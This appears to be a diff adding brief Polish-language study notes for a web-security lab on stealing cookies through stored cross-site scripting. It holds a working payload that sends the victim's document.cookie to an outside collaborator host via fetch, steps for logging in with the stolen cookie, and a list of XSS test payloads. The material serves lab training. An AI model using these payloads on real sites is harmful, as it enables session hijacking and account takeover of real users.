@@ -1,0 +1,31 @@
+Lab: Exploiting cross-site scripting to steal cookies
+
+1. Znajdź pole podatne na Stored XSS
+2. Wstrzyknij payload który wysyła cookie na Collaborator
+3. Sprawdź Collaborator – cookie ofiary przyjdzie tam
+4. Użyj cookie żeby zalogować się jako ofiara
+
+
+<script>
+fetch('https://3nro0742djx8ucbb7bn71vsyyp4gs8gx.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+
+
+testy do formuklarza
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.location)</script>
+<script>alert(document.title)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg onload=alert(document.cookie)>
+
+DLACZEGO PAYLOAD Z FETCH
+fetch – aktywnie wysyła dane na Twój serwer:
+iframe ładuje stronę – nie wysyła danych
